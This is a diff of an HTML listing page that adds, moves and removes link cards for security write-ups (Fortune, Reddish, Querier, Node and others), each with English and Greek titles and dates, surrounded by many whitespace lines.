+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fortune_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/fortune.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Fortune write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Fortune</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">02 Aug 2019</time>
+      <time lang="el">02 Αυγ 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
            
           
            
@@ -1744,6 +1460,242 @@ Firefox 44.0.2 - ASM.JS JIT-Spray Remote Code Execution https://www.exploit-db.c
            
            
            
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Optimum write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Optimum</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">28 Oct 2017</time>
+      <time lang="el">28 Οκτ 2017</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/nineveh_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/nineveh.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Nineveh write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Nineveh</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">17 Dec 2017</time>
+      <time lang="el">17 Δεκ 2017</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/reddish_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/reddish.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Reddish write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Reddish</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">26 Jan 2019</time>
+      <time lang="el">26 Ιαν 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/sense_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/pfsense.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Sense write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Sense</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">24 Mar 2018</time>
+      <time lang="el">24 Μαρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/querier_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/querier.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Querier write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Querier</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">22 Jun 2019</time>
+      <time lang="el">22 Ιουν 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/lacasadepapel_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/ace.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">LaCasaDePapel write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του LaCasaDePapel</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">27 Jul 2019</time>
+      <time lang="el">27 Ιουλ 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
           
            
            
@@ -1781,22 +1733,157 @@ Firefox 44.0.2 - ASM.JS JIT-Spray Remote Code Execution https://www.exploit-db.c
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/minion_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/node_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/minions.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/jscode.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Minion write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Minion</h3>
+      <h3 class="title" lang="en">Node write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Node</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">10 Apr 2018</time>
-      <time lang="el">10 Απρ 2018</time>
+      <time lang="en">03 Mar 2018</time>
+      <time lang="el">03 Μαρ 2018</time>
     </footer>
   </a>
 </article>
 
            
           
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
           
            
            
@@ -1898,6 +1985,11 @@ Firefox 44.0.2 - ASM.JS JIT-Spray Remote Code Execution https://www.exploit-db.c
            
            
            
+          
+           
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
   <a href="https://alamot.github.io/path_traversal_archiver/" class="clearfix">
     <div class="cell">
@@ -1933,6 +2025,92 @@ Firefox 44.0.2 - ASM.JS JIT-Spray Remote Code Execution https://www.exploit-db.c
            
            
            
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/oracle/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/oracle.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Ask and you shall receive</h3>
+      <h3 class="title" lang="el">Ζήτα και θα λάβεις</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">04 May 2019</time>
+      <time lang="el">04 Μαϊ 2019</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -2115,171 +2293,6 @@ Firefox 44.0.2 - ASM.JS JIT-Spray Remote Code Execution https://www.exploit-db.c
            
            
            
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
             <article class="li col-sm-6 col-md-4">
   <a href="https://alamot.github.io/winrm_shell/" class="clearfix">
     <div class="cell">
@@ -2295,6 +2308,101 @@ Firefox 44.0.2 - ASM.JS JIT-Spray Remote Code Execution https://www.exploit-db.c
   </a>
 </article>
 
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
            
           
            
@@ -2521,87 +2629,6 @@ Firefox 44.0.2 - ASM.JS JIT-Spray Remote Code Execution https://www.exploit-db.c
            
            
            
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/oracle/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/oracle.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Ask and you shall receive</h3>
-      <h3 class="title" lang="el">Ζήτα και θα λάβεις</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">04 May 2019</time>
-      <time lang="el">04 Μαϊ 2019</time>
-    </footer>
-  </a>
-</article>
-
            
           
            
